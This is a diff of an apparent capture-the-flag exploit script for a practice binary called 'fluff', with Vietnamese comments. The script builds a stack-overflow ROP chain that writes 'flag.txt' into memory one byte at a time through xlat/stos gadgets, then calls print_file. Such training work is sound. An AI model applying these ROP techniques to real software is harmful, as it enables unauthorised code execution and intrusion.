@@ -5,11 +5,10 @@ context.arch            = "amd64"
 elf = context.binary = ELF('./fluff', checksec=False)
 
 p = process("./fluff")
-
-gdb.attach(p, gdbscript='''
-b*pwnme+152
-c
-''')
+#gdb.attach(p, gdbscript='''
+#b*pwnme+152
+#c
+#''')
 
 ret = ROP(elf).find_gadget(["ret"])[0]
 pop_rdi_ret = ROP(elf).find_gadget(["pop rdi", "ret"])[0]
@@ -33,7 +32,8 @@ null_addr = 0x6010f0
    
 payload1 = flat(#rdx , rcx , addrcx
 	cyclic(0x28),
-	pop_rdx_rcx_addrcx,
+
+	pop_rdx_rcx_addrcx,             #ghi f vào 0x6010f0
 	0x3000,
 	f_char-0x3ef2-0xb,
 	xlat,
@@ -41,7 +41,7 @@ payload1 = flat(#rdx , rcx , addrcx
 	null_addr,
 	xtos,
 	
-	pop_rdx_rcx_addrcx,
+	pop_rdx_rcx_addrcx,             #ghi l vào 0x6010f1
 	0x3000,
 	l_char-0x3ef2-0x66,
 	xlat,
@@ -49,7 +49,7 @@ payload1 = flat(#rdx , rcx , addrcx
 	null_addr + 1,
 	xtos,
 	
-	pop_rdx_rcx_addrcx,
+	pop_rdx_rcx_addrcx,             #ghi a vào 0x6010f2
 	0x3000,
 	a_char-0x3ef2-0x6c,
 	xlat,
@@ -57,7 +57,7 @@ payload1 = flat(#rdx , rcx , addrcx
 	null_addr + 2,
 	xtos,
 	
-	pop_rdx_rcx_addrcx,
+	pop_rdx_rcx_addrcx,             #ghi g vào 0x6010f3
 	0x3000,
 	g_char-0x3ef2-0x61,
 	xlat,
@@ -65,7 +65,7 @@ payload1 = flat(#rdx , rcx , addrcx
 	null_addr + 3,
 	xtos,
 	
-	pop_rdx_rcx_addrcx,
+	pop_rdx_rcx_addrcx,             #ghi . vào 0x6010f4
 	0x3000,
 	dot_char-0x3ef2-0x67,
 	xlat,
@@ -73,7 +73,7 @@ payload1 = flat(#rdx , rcx , addrcx
 	null_addr + 4,
 	xtos,
 	
-	pop_rdx_rcx_addrcx,
+	pop_rdx_rcx_addrcx,             #ghi t vào 0x6010f5
 	0x3000,
 	t_char-0x3ef2-0x2e,
 	xlat,
@@ -81,7 +81,7 @@ payload1 = flat(#rdx , rcx , addrcx
 	null_addr + 5,
 	xtos,
 	
-	pop_rdx_rcx_addrcx,
+	pop_rdx_rcx_addrcx,             #ghi x vào 0x6010f6
 	0x3000,
 	x_char-0x3ef2-0x74,
 	xlat,
@@ -89,7 +89,7 @@ payload1 = flat(#rdx , rcx , addrcx
 	null_addr + 6,
 	xtos,
 	
-	pop_rdx_rcx_addrcx,
+	pop_rdx_rcx_addrcx,             #ghi t vào 0x6010f7
 	0x3000,
 	t_char-0x3ef2-0x78,
 	xlat,
@@ -97,7 +97,7 @@ payload1 = flat(#rdx , rcx , addrcx
 	null_addr + 7,
 	xtos,
 	
-	pop_rdi_ret,
+	pop_rdi_ret,                    #đưa địa chỉ 0x6010f0 chứa chuỗi "flag.txt" vào rdi và call print_file
 	null_addr,
 	vuln+9	
     )
